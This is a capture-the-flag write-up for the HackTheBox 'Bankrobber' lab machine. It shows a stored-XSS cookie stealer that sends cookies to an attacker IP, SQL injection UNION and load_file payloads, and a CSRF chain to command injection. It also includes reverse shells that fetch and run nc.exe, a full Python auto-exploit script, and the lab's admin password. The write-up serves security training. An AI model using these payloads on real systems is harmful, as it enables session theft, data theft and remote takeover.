---
title: "HackTheBox - Bankrobber"
categories: [HackTheBox, Insane]
tags: [Windows,Insane,Web,OSWE]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2002:45:08.png
---


BankRobber is a very interesting and useful box when you are trying to get some XSS and SQLInjection to train on. Not so hard the first shell, I think the most difficult part of it is the privilege escalation, which one I will complete in the future.

The exploit for the first shell is on the post. And in the end, the source code of the app, to understand where the vulnerabilities and being triggered on the app.

# Diagram

Not complete yet, I'll return here latter and get it all.

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.154
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2002:46:24.png)

## Port 80

We try to open it on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2002:45:31.png)


### Gobuster

Let's start crafting a little more on the box to see if we can enum more things do explore

```sh
gobuster dir -u http://10.10.10.154 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

We found a bunch of directories in it. Fine.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:01:25.png)

The admin and user called my attention
 
But that's obsviouslly that we cannot access because our permissions

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:03:27.png)

We cannot access the user too

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:03:43.png)

### Login

We could try to create a login in it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:04:31.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:04:46.png)

Now we Login

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:05:00.png)

We are redirect to /user

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:07:33.png)

We saw some requests

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:08:14.png)

Interesting... our password as cookie

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:08:38.png)

We see some interesting javascript being executed too

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:09:32.png)

We try to transfer some amount

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:11:52.png)

Hummm... A "time" message

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:11:59.png)

Seems that we should have some kind of XSS happening here

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:12:40.png)

## XSS

So, we test the basic payloads, to see if it catch us

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:19:36.png)

And after one minute we get back

`<script src="http://10.10.14.20"></script>`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:21:00.png)

How we get a admin looking at the comment tab, we possible can create a malicious JS to send us the cookies values

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:27:00.png)

And we got it!

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:27:20.png)

0x4rt3mis.js

```js
function send_cookie(){
        var req=new XMLHttpRequest();
        req.open('GET', 'http://10.10.14.20/?xss=' + document.cookie, true);
        req.send();
}

send_cookie();
```

And playing with it, we got the admin credentials

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:28:55.png)

```
admin 
Hopelessromantic
```

We login as admin

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:30:00.png)

And we have access to the admin panel

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:30:14.png)

### Admin Enumeration

We start looking at the pages that the admin has access

notes.txt

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:54:02.png)

We see to options. Search users and backdorchecker

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:55:36.png)

Both of them show me problems. Interesing

When we try a sqlinjection in this field

```
There is a problem with your SQL syntax
```

And when we try to send commands on the other field

```
It's only allowed to access this function from localhost (::1).
This is due to the recent hack attempts on our server.
```

Just comming from localhost... Ok...

### SQLInjection

Let's focus on the SQLInjection

After some standart paylaods we found it working

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:00:28.png)

We can start getting data with `UNION SELECT` queries

We got that the it has 3 columns

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:11:28.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:11:07.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:11:43.png)

We can test, for example, to get the database version

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:12:09.png)

And with [this](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) cheat sheet we can get the admin hash

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:30:11.png)

We get the type hash

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:33:01.png)

And on crackstation we got it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:41:08.png)

We can also get a NTLM hash with responder

```
term=1'UNION+SELECT+load_file('\\\\10.10.14.20\\\\0x4rt3mis'),2,3--+-
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2006:37:53.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2006:38:02.png)

We can get the source code of the other function with load_file function

```
term=1'UNION+SELECT+load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),2,3--+-
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2006:41:58.png)

## CRSF

The thing we need to do, is make the admin execute commands comming from localhost on backdoorchecker.php

And we have RCE...

```js
// Function created to simplify the debbug, always send as param the value you want to debbug
function debug(debug){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9999/' + debug, true);
        xhr.send();
}


// Function just to try cmd id
function getRCE(){
        var rev = new XMLHttpRequest();
        var url = "http://localhost/admin/backdoorchecker.php";
        var data = 'cmd=dir|powershell -c "ping 10.10.14.20"';
        rev.open("POST", url, true);
        rev.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        rev.send(data);
        debug(document.cookie);
}

getRCE()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:23:18.png)

Now, we get reverse shell

```js
// Function created to simplify the debbug, always send as param the value you want to debbug
function debug(debug){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9999/' + debug, true);
        xhr.send();
}


// Function just to try cmd id
function getRCE(){
        var rev = new XMLHttpRequest();
        var url = "http://localhost/admin/backdoorchecker.php";
        var data = "cmd=dir|\\\\10.10.14.20\\0x4rt3mis\\nc.exe 10.10.14.20 5555 -e powershell.exe";
        rev.open("POST", url, true);
        rev.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        rev.send(data);
        debug(document.cookie);
}

getRCE()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2007:43:23.png)

Let's automate the whole things now!

# Auto Reverse Shell

We will use our python skeleton to do that

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2008:10:53.png)

rev_bank.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Exploit - Auto Reverse Shell - BankRobber - HackTheBox

import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    os.system("rm 0x4rt3mis.js")
    os.system("rm nc.exe")
    t.interact()

def createPayloadJS(lhost,lport):
    print("[+] Preparing the payload !! [+]")
    os.system("cp /usr/share/windows-binaries/nc.exe .")
    payload = "function getRCE(){\n"
    payload += "        var rev = new XMLHttpRequest();\n"
    payload += "        var url = 'http://localhost/admin/backdoorchecker.php';\n"
    payload += "        var data = 'cmd=dir|powershell -c \"iwr -uri " + lhost + "/nc.exe -outfile %temp%\\\\nc.exe\"; %temp%\\\\nc.exe -e cmd.exe " + lhost + " " + lport + "';\n"
    payload += "        rev.open('POST', url, true);\n"
    payload += "        rev.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');\n"
    payload += "        rev.send(data);\n"
    payload += "}\n"
    payload += "\n"
    payload += "getRCE()"
    f = open("0x4rt3mis.js", "w")
    f.write(payload)
    f.close()
    print("[+] Done !! [+]")
    
def createAccount(rhost):
    print("[+] Creating Account ! [+]")
    url = "http://%s:80/register.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "pounds": "Submit Query"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] Created ! [+]")
    
def loginAccount(rhost):
    print("[+] Just Login ! [+]")
    url = "http://%s:80/login.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "pounds": "Submit Query"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies)
    print("[+] Logged In ! [+]")
    
def launchXSS(rhost):
    print("[+] Let's trigger XSS ! [+]")
    url = "http://%s:80/user/transfer.php" %rhost
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    data = {"fromId": "3", "toId": "1", "amount": "1", "comment": "<script src=\"http://10.10.14.20/0x4rt3mis.js\"></script>"}
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
    print("[+] Triggered, wait 120 seconds ! [+]")
    os.system("sleep 120")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    parser.add_argument('-lp', '--port', help='Local port to receive shell', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip
    lport = args.port

    '''Here we call the functions'''
    # Set up the web python server
    webServer()
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Create the JS payload
    createPayloadJS(lhost,lport)
    # Create Account
    createAccount(rhost)
    # Login
    loginAccount(rhost)
    # Trigger and wait
    launchXSS(rhost)

if __name__ == '__main__':
    main()
```

# Source Code Analysis

We start looking at the web app file to understand how it was estructured

We copy the htdocs folder to our Kali

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2012:58:53.png)

auth.php

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2012:36:29.png)

This is just the mechanisn of authentication, when it decode in base64 the credentials and check if it matches with the admin one.

backdoorchecker.php

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2012:38:17.png)

handle.php

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2012:38:42.png)

search.php

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2012:39:02.png)

transfer.php

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-11-01-HackTheBox-Bankrobber/2021-11-01-HackTheBox-Bankrobber%2012:41:47.png)